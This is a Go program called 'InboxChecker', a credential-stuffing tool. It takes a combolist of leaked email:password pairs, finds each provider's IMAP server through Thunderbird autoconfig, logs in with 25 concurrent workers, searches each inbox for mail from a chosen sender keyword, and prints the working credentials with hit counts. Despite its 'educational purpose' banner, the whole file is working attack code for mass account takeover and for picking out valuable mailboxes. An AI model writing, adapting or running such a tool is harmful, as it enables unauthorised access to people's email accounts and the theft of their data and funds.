package main

import (
	"bufio"
	"encoding/xml"
	"fmt"
	"github.com/briandowns/spinner"
	"github.com/emersion/go-imap"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
	//"github.com/emersion/go-imap"
	"github.com/emersion/go-imap/client"
)

var mut sync.Mutex

const xthreads = 25 // Total number of threads to use, excluding the main() thread
var success []string
var stringByte string
var count int
var t string

type ClientConfig struct {
	XMLName       xml.Name `xml:"clientConfig"`
	EmailProvider struct {
		IncomingServer []struct {
			Text           string `xml:",chardata"`
			Type           string `xml:"type,attr"`
			Hostname       string `xml:"hostname"`
			Port           string `xml:"port"`
			SocketType     string `xml:"socketType"`
			Authentication string `xml:"authentication"`
			Username       string `xml:"username"`
		} `xml:"incomingServer"`
	} `xml:"emailProvider"`
}

type smtpserver struct {
	servername string
	username   string
	password   string
	port       int
}

func main() {
	fmt.Println("##################################################################################################")
	fmt.Println("### InboxChecker                              ###")
	fmt.Println("### For Educational purpose only, used at your own risk                                        ###")
	fmt.Println("### Require your combolist and a search string                                                ###")
	fmt.Println("##################################################################################################")

	log.Println("Type the name of your combolist file in txt format: ")
	var cfilename string
	fmt.Scanln(&cfilename)
	log.Println("Type keyword to search for: ")
	var searchstring string
	fmt.Scanln(&searchstring)

	file := cfilename
	//file:="checker2.txt"
	//searchstring="crypto"
	t = file
	p, err := ioutil.ReadFile(file)
	if err != nil {
		log.Fatal(err)
	}
	lc, err := lineCount(file)
	if err != nil {
		fmt.Println(err)
		return
	}
	//data := strings.Split(strings.TrimSuffix(string(p), "\r\n"), "\r\n")
	data := strings.Split(string(p), "\r\n") //windows made txt files
	if len(data) == 1 {
		data = strings.Split(string(p), "\n") //linux made txt files
	}

	fmt.Println("Input file name: ", file)
	fmt.Println("Searching for keyword: ", searchstring)
	fmt.Println("Total Number of username/password to search:", lc)

	var ch = make(chan string, lc+50) // This number 50 can be anything as long as it's larger than xthreads
	var wg sync.WaitGroup
	// Now the jobs can be added to the channel, which is used as a queue
	for _, buff := range data {
		ch <- buff
	}
	//bar := pb.StartNew(int(lc))
	s := spinner.New(spinner.CharSets[17], 100*time.Millisecond)
	//s.Color("red", "bold")
	s.Start()
	wg.Add(xthreads)
	for i := 0; i < xthreads; i++ {

		go func() {
			for {
				a, ok := <-ch

				if !ok { // if there is nothing to do and the channel has been closed then end the goroutine
					wg.Done()
					return
				}
				//bar.Increment()
				dowork(a, searchstring) // do the thing
			}
		}()
	}
	close(ch) // This tells the goroutines there's nothing else to do
	wg.Wait() // Wait for the threads to finish
	//bar.FinishPrint("Done")
	s.Stop()

}

func dowork(datainfo string, searchstring string) {
	//check for valid username and password
	components := strings.Split(datainfo, ":")
	if len(components) < 2 {
		return
	}
	email := strings.ToLower(components[0])
	pass := components[1]
	//check for valid email
	emailRegexp := regexp.MustCompile("^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$")
	if !emailRegexp.MatchString(email) {
		return
	}
	emailSplit := strings.Split(email, "@")
	domain := emailSplit[1]
	xmlBytes, err := getXML("https://autoconfig.thunderbird.net/v1.1/" + domain)
	var imap1 string
	if err == nil {
		var result ClientConfig
		xml.Unmarshal(xmlBytes, &result)

		//n:=smtpserver{servername:result.EmailProvider.IncomingServer[0].Hostname,username:email,password:pass,port:port}
		imap1 = result.EmailProvider.IncomingServer[0].Hostname + ":993"

		//port,_:=strconv.Atoi(result.EmailProvider.IncomingServer[0].Port)

		//log.Printf("Connecting to server %s with proxy %s...",imap,sock[x])

		// Connect to server

		c, err := client.DialTLS(imap1, nil)
		if err != nil {
			//log.Println(err)
			return
		}
		//log.Println("Connected")

		// Don't forget to logout
		defer c.Logout()

		// Login
		if err := c.Login(email, pass); err != nil {
			//fmt.Println(err)
			return
			//log.Fatal(err)
		}
	} else {
		return
	}
	username := email
	password := pass
	servername := imap1
	//log.Println("Connecting to server...")

	// Connect to server
	c1, err := client.DialTLS(servername, nil)
	if err != nil {
		//log.Println(err)
		return
	}
	//log.Println("Connected")

	// Don't forget to logout
	defer c1.Logout()

	// Login
	if err := c1.Login(username, password); err != nil {
		//log.Fatal(err)
		return
	}
	//log.Println("Logged in")

	//seARCH

	// Select INBOX
	_, err = c1.Select("INBOX", false)
	if err != nil {
		//log.Println(err)
		return
	}

	// Set search criteria
	/**criteria1:=imap.NewSearchCriteria()
	criteria2:=imap.NewSearchCriteria()
	criteria_or:=imap.NewSearchCriteria()
	criteria_or.Or=[][2]*imap.SearchCriteria{{criteria1,criteria2}}**/
	//start searching

	criteria := imap.NewSearchCriteria()
	criteria.Header.Add("From", searchstring)

	//criteria1.Header.Add("SUBJECT", "have sex today")
	//criteria2.Header.Add("From", "facebook")
	ids, err := c1.Search(criteria)
	if err != nil {
		//log.Println(err)
		return
	}
	//log.Println("IDs found:", ids)
	//var section imap.BodySectionName
	if len(ids) > 0 {

		show := fmt.Sprintf("%s:%s|%s:%d hits", username, password, searchstring, len(ids))
		fmt.Println(show)

	}

}

func lineCount(filename string) (int64, error) {
	lc := int64(0)
	f, err := os.Open(filename)
	if err != nil {
		return 0, err
	}
	defer f.Close()
	s := bufio.NewScanner(f)
	for s.Scan() {
		lc++
	}
	return lc, s.Err()
}

func getXML(url string) ([]byte, error) {
	resp, err := http.Get(url)
	if err != nil {
		return []byte{}, fmt.Errorf("GET error: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return []byte{}, fmt.Errorf("Status error: %v", resp.StatusCode)
	}

	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return []byte{}, fmt.Errorf("Read body: %v", err)
	}

	return data, nil
}
